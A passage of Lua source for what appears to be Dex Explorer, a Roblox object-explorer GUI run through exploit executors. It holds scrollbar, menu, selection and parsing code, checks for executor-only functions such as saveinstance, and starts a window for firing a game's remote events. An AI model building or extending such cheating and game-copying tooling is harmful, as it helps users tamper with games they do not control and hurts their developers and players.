			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Explorer panel

local explorerPanel = script.Parent
Create(explorerPanel,{
	BackgroundColor3 = GuiColor.Field;
	BorderColor3 = GuiColor.Border;
	Active = true;
})

local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

local CurrentSaveInstanceWindow
local CurrentRemoteWindow

local lastSelectedNode

local DexStorage
local DexStorageMain
local DexStorageEnabled

if saveinstance then DexStorageEnabled = true end

if DexStorageEnabled then
	DexStorage = Instance.new("Folder")
	DexStorage.Name = "Dex"
	DexStorageMain = Instance.new("Folder",DexStorage)
	DexStorageMain.Name = "DexStorage"
end

local NilStorage
local NilStorageMain
local NilStorageEnabled

if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

if NilStorageEnabled then
	NilStorage = Instance.new("Folder")
	NilStorage.Name = "Dex Internal Storage"
	NilStorageMain = Instance.new("Folder",NilStorage)
	NilStorageMain.Name = "Nil Instances"
end

local listFrame = Create('Frame',{
	Name = "List";
	BackgroundTransparency = 1;
	ClipsDescendants = true;
	Position = UDim2.new(0,0,0,HEADER_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
	Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = GUI_SIZE
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-GUI_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
	Visible = false;
	Parent = explorerPanel;
})

local headerFrame = Create('Frame',{
	Name = "Header";
	BackgroundColor3 = GuiColor.Background;
	BorderColor3 = GuiColor.Border;
	Position = UDim2.new(0,0,0,0);
	Size = UDim2.new(1,0,0,HEADER_SIZE);
	Parent = explorerPanel;
	Create('TextLabel',{
		Text = "Explorer";
		BackgroundTransparency = 1;
		TextColor3 = GuiColor.Text;
		TextXAlignment = 'Left';
		Font = FONT;
		FontSize = FONT_SIZE;
		Position = UDim2.new(0,4,0,0);
		Size = UDim2.new(1,-4,0.5,0);
	});
})

local explorerFilter = 	Create('TextBox',{
	Text = "Filter Workspace";
	BackgroundTransparency = 0.8;
	TextColor3 = GuiColor.Text;
	TextXAlignment = 'Left';
	Font = FONT;
	FontSize = FONT_SIZE;
	Position = UDim2.new(0,4,0.5,0);
	Size = UDim2.new(1,-8,0.5,-2);
});
explorerFilter.Parent = headerFrame

SetZIndexOnChanged(explorerPanel)

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 20;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local currentRightClickMenu
local CurrentInsertObjectWindow
local CurrentFunctionCallerWindow

local RbxApi

function ClassCanCreate(IName)
	local success,err = pcall(function() Instance.new(IName) end)
	if err then
		return false
	else
		return true
	end
end

function GetClasses()
	if RbxApi == nil then return {} end
	local classTable = {}
	for i,v in pairs(RbxApi.Classes) do
		if ClassCanCreate(v.Name) then
			table.insert(classTable,v.Name)
		end
	end
	return classTable
end

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function FunctionIsHidden(functionData)
	local tags = functionData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

local function GetAllFunctions(className)
	local class = RbxApi.Classes[className]
	local functions = {}
	
	if not class then return functions end
	
	while class do
		if class.Name == "Instance" then break end
		for _,nextFunction in pairs(class.Functions) do
			if not FunctionIsHidden(nextFunction) then
				table.insert(functions, nextFunction)
			end
		end
		class = RbxApi.Classes[class.Superclass]
	end
	
	sortAlphabetic(functions, "Name")

	return functions
end

function GetFunctions()
	if RbxApi == nil then return {} end
	local List = SelectionVar():Get()
	
	if #List == 0 then return end
	
	local MyObject = List[1]
	
	local functionTable = {}
	for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
		table.insert(functionTable,v)
	end
	return functionTable
end

function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a < b end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,200,1,0)
		menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end,1)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a.Name < b.Name end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,300,1,0)
		menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
		
		local function GetParameters(functionData)
			local paraString = ""
			paraString = paraString.."("
			for i,v in pairs(functionData.Arguments) do
				paraString = paraString..v.Type.." "..v.Name
				if i < #functionData.Arguments then
					paraString = paraString..", "
				end
			end
			paraString = paraString..")"
			return paraString
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
				choice(name)
			end,2)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateInsertObject()
	if not CurrentInsertObjectWindow then return end
	CurrentInsertObjectWindow.Visible = true
	if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
	end
	if CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Parent = explorerPanel.Parent
	end
end

function CreateFunctionCaller()
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow:Destroy()
		CurrentFunctionCallerWindow = nil
	end
	CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
		GetFunctions(),
		"",
		false,
		function(option)
			CurrentFunctionCallerWindow:Destroy()
			CurrentFunctionCallerWindow = nil
			local list = SelectionVar():Get()
			for i = 1,#list do
				pcall(function() Instance.new(option,list[i]) end)
			end
			print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
			--CallFunction()
			DestroyRightClick()
		end
	)
	if currentRightClickMenu and CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
	end
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
	end
end

function CreateRightClickMenuItem(text, onClick, insObj)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	if insObj == 1 then
		local newIcon = Icon(nil,ExplorerIndex[text] or 0)
		newIcon.Position = UDim2.new(0,0,0,2)
		newIcon.Size = UDim2.new(0,16,0,16)
		newIcon.IconMap.ZIndex = 5
		newIcon.Parent = button
		button.Text = "\t\t"..button.Text
	elseif insObj == 2 then
		button.FontSize = Enum.FontSize.Size11
	end
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
		if not insObj and CurrentInsertObjectWindow then
			if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
				CreateInsertObject()
			elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
				CurrentInsertObjectWindow.Visible = false
			end
		end
		if not insObj then
			if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			elseif button.Text == "Call Function" then
				CreateFunctionCaller()
			end
		end
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
		onClick(text)
	end)	
	return button
end

function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()

	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			frame:Destroy()
			DestroyRightClick()
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 5)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

local clipboard = {}
local function delete(o)
	o.Parent = nil
end

local getTextWidth do
	local text = Create('TextLabel',{
		Name = "TextWidth";
		TextXAlignment = 'Left';
		TextYAlignment = 'Center';
		Font = FONT;
		FontSize = FONT_SIZE;
		Text = "";
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,1,0);
		Visible = false;
		Parent = explorerPanel;
	})
	function getTextWidth(s)
		text.Text = s
		return text.TextBounds.x
	end
end

local nameScanned = false
-- Holds the game tree converted to a list.
local TreeList = {}
-- Matches objects to their tree node representation.
local NodeLookup = {}

local nodeWidth = 0

local QuickButtons = {}

function filteringWorkspace()
	if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
		return true
	end
	return false
end

function lookForAName(obj,name)
	for i,v in pairs(obj:GetChildren()) do
		if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
		lookForAName(v,name)
	end
end

function scanName(obj)
	nameScanned = false
	if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
		nameScanned = true
	else
		lookForAName(obj,explorerFilter.Text)
	end
	return nameScanned
end

function updateActions()
	for i,v in pairs(QuickButtons) do
		if v.Cond() then
			v.Toggle(true)
		else
			v.Toggle(false)
		end
	end
end

local updateList,rawUpdateList,updateScroll,rawUpdateSize do
	local function r(t)
		for i = 1,#t do
			if not filteringWorkspace() or scanName(t[i].Object) then
				TreeList[#TreeList+1] = t[i]

				local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
				if w > nodeWidth then
					nodeWidth = w
				end
				if t[i].Expanded or filteringWorkspace() then
					r(t[i])
				end
			end
		end
	end

	function rawUpdateSize()
		scrollBarH.TotalSpace = nodeWidth
		scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
		scrollBarH:Update()
		local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
		scrollBarH.GUI.Visible = visible

		listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

		scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
		scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)
		
		scrollBar.TotalSpace = #TreeList+1
		scrollBar:Update()
	end

	function rawUpdateList()
		-- Clear then repopulate the entire list. It appears to be fast enough.
		TreeList = {}
		nodeWidth = 0
		r(NodeLookup[workspace.Parent])
		if DexStorageEnabled then
			r(NodeLookup[DexStorage])
		end
		if NilStorageEnabled then
			r(NodeLookup[NilStorage])
		end
		rawUpdateSize()
		updateActions()
	end

	-- Adding or removing large models will cause many updates to occur. We
	-- can reduce the number of updates by creating a delay, then dropping any
	-- updates that occur during the delay.
	local updatingList = false
	function updateList()
		if updatingList then return end
		updatingList = true
		wait(0.25)
		updatingList = false
		rawUpdateList()
	end

	local updatingScroll = false
	function updateScroll()
		if updatingScroll then return end
		updatingScroll = true
		wait(0.25)
		updatingScroll = false
		scrollBar:Update()
	end
end

local Selection do
	local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
	if not bindGetSelection then
		bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
		bindGetSelection.Parent = explorerPanel
	end

	local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
	if not bindSetSelection then
		bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
		bindSetSelection.Parent = explorerPanel
	end

	local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
	if not bindSelectionChanged then
		bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
		bindSelectionChanged.Parent = explorerPanel
	end

	local SelectionList = {}
	local SelectionSet = {}
	local Updates = true
	Selection = {
		Selected = SelectionSet;
		List = SelectionList;
	}

	local function addObject(object)
		-- list update
		local lupdate = false
		-- scroll update
		local supdate = false

		if not SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				table.insert(SelectionList,object)
				SelectionSet[object] = true
				node.Selected = true

				-- expand all ancestors so that selected node becomes visible
				node = node.Parent
				while node do
					if not node.Expanded then
						node.Expanded = true
						lupdate = true
					end
					node = node.Parent
				end
				supdate = true
			end
		end
		return lupdate,supdate
	end

	function Selection:Set(objects)
		local lupdate = false
		local supdate = false

		if #SelectionList > 0 then
			for i = 1,#SelectionList do
				local object = SelectionList[i]
				local node = NodeLookup[object]
				if node then
					node.Selected = false
					SelectionSet[object] = nil
				end
			end

			SelectionList = {}
			Selection.List = SelectionList
			supdate = true
		end

		for i = 1,#objects do
			local l,s = addObject(objects[i])
			lupdate = l or lupdate
			supdate = s or supdate
		end

		if lupdate then
			rawUpdateList()
			supdate = true
		elseif supdate then
			scrollBar:Update()
		end

		if supdate then
			bindSelectionChanged:Fire()
			updateActions()
		end
	end

	function Selection:Add(object)
		local l,s = addObject(object)
		if l then
			rawUpdateList()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		elseif s then
			scrollBar:Update()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end
	
	function Selection:StopUpdates()
		Updates = false
	end
	
	function Selection:ResumeUpdates()
		Updates = true
		bindSelectionChanged:Fire()
		updateActions()
	end

	function Selection:Remove(object,noupdate)
		if SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				node.Selected = false
				SelectionSet[object] = nil
				for i = 1,#SelectionList do
					if SelectionList[i] == object then
						table.remove(SelectionList,i)
						break
					end
				end

				if not noupdate then
					scrollBar:Update()
				end
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end

	function Selection:Get()
		local list = {}
		for i = 1,#SelectionList do
			list[i] = SelectionList[i]
		end
		return list
	end

	bindSetSelection.OnInvoke = function(...)
		Selection:Set(...)
	end

	bindGetSelection.OnInvoke = function()
		return Selection:Get()
	end
end

function CreateCaution(title,msg)
	local newCaution = CautionWindow:Clone()
	newCaution.Title.Text = title
	newCaution.MainWindow.Desc.Text = msg
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

function CreateTableCaution(title,msg)
	if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
	local newCaution = TableCautionWindow:Clone()
	newCaution.Title.Text = title
	
	local TableList = newCaution.MainWindow.TableResults
	local TableTemplate = newCaution.MainWindow.TableTemplate
	
	for i,v in pairs(msg) do
		local newResult = TableTemplate:Clone()
		newResult.Type.Text = type(v)
		newResult.Value.Text = tostring(v)
		newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Parent = TableList
		TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Visible = true
	end
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Number" then
		return tonumber(value)
	elseif type == "String" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif type == "Script" then
		local success,err = ypcall(function()
		_G.D_E_X_DONOTUSETHISPLEASE = nil
		loadstring(
			"_G.D_E_X_DONOTUSETHISPLEASE = "..value
		)()
		return _G.D_E_X_DONOTUSETHISPLEASE
		end)
		if err then
			return nil
		end
	else
		return nil
	end
end

local function ToPropValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif string.sub(value,1,4) == "Enum" then
		local getEnum = value
		while true do
			local x,y = string.find(getEnum,".")
			if y then
				getEnum = string.sub(getEnum,y+1)
			else
				break
			end
		end
		print(getEnum)
		return getEnum
	else
		return nil
	end
end

function PromptRemoteCaller(inst)
	if CurrentRemoteWindow then
		CurrentRemoteWindow:Destroy()
		CurrentRemoteWindow = nil
	end
	CurrentRemoteWindow = RemoteWindow:Clone()
	CurrentRemoteWindow.Parent = explorerPanel.Parent
	CurrentRemoteWindow.Visible = true
	
	local displayValues = false
	
	local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
	local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate
	
	if inst:IsA("RemoteEvent") then
		CurrentRemoteWindow.Title.Text = "Fire Event"
		CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
		CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
		CurrentRemoteWindow.MainWindow.Desc2.Visible = false
	end
	
	local newArgument = ArgumentTemplate:Clone()
	newArgument.Parent = ArgumentList
	newArgument.Visible = true
